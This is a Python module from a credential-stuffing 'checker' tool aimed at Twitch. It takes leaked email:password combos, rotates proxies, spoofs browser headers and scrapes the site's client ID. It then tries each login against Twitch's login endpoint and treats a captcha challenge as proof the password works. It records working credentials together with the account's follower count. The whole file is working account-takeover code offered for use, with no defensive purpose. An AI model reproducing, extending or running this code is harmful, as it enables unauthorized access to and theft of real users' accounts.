from modules.variables import Checker
from modules.functions import bad_proxy, log,save,set_proxy
from requests import get,post

def check(email:str,password:str):
    username = email.split("@")[0] if "@" in email else email
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)

        data_1 = {"username":username,"password":password,"client_id":"","undelete_user":False} 
        data_2 = [{"operationName":"PersonalSections","variables":{"input":{"sectionInputs":["FOLLOWED_SECTION","RECOMMENDED_SECTION","SIMILAR_SECTION"],"recommendationContext":{"platform":"web"},"contextChannelName":username},"channelLogin":username,"withChannelUser":True},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"469efc9442aa2b7634a3ab36eae1778b78ec7ccf062d2b17833afb0e66b78a25"}}}]
        data_3 = {"variables":{"channelID":""},"query":"query ProfileInfoFromChannelID($channelID: ID!) { user(id: $channelID) { __typename ...ProfileInfoFragment } }fragment ProfileInfoFragment on User { __typename id login displayName description profileImageURL(width: 600) bannerImageURL profileViewCount followers { __typename totalCount } lastBroadcast { __typename startedAt } stream { __typename game { __typename displayName } viewersCount } roles { __typename isPartner } currentUser: self { __typename subscriptionBenefit { __typename id } } panels { __typename ... on DefaultPanel { title linkURL imageURL description } } primaryColorHex ...SubscriptionProductEligibilityFragment channel { __typename socialMedias { __typename ...SocialMediaFragment } } }fragment SubscriptionProductEligibilityFragment on User { __typename subscriptionProducts { __typename offers { __typename eligibility { __typename isEligible } } } }fragment SocialMediaFragment on SocialMedia { __typename id name title url }"}
        header_1 = {
            "accept": "*/*" ,
            "accept-encoding": "gzip, deflate, br", 
            "accept-language": "en-US,en;q=0.9" ,
            "origin": "https://www.twitch.tv", 
            "referer": "https://www.twitch.tv/", 
            "sec-fetch-dest": "empty" ,
            "sec-fetch-mode": "cors" ,
            "sec-fetch-site": "same-site", 
            "user-agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
        }
        header_2 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" ,
            "Pragma": "no-cache" ,
            "Accept": "*/*" ,
            "Client-Id": "",
        }
        try:
            client = get("https://www.twitch.tv/",proxies=proxy_set,timeout=Checker.timeout).text.split("clientId=\"")[1].split("\",")[0]
            data_1["client_id"] = client
            header_2["Client-Id"] = client
            
            response = post("https://passport.twitch.tv/login",json=data_1,headers=header_1,proxies=proxy_set,timeout=Checker.timeout)
            if "Incorrect username or password" in response.text or "We have disabled the ability to log in with your email address. Please log in with your username" in response.text:
                retries+=1
            elif "captcha_proof" in response.text:
                id = post("https://gql.twitch.tv/gql",json=data_2,headers=header_2,proxies=proxy_set,timeout=Checker.timeout).json()[0]["data"]["contextUser"]["id"]
                data_3["variables"]["channelID"] = id

                followers = post("https://gql.twitch.tv/gql",headers=header_2,json=data_3,proxies=proxy_set,timeout=Checker.timeout).json()["data"]["user"]["followers"]["totalCount"]

                Checker.good += 1
                Checker.cpm += 1
                if not Checker.cui:
                    log("good",username+":"+password,"Twitch")
                save("Twitch","good",Checker.time,username+":"+password+f" | Followers: {followers} | Original Combo: {email}:{password}")
                return
            else:
                raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return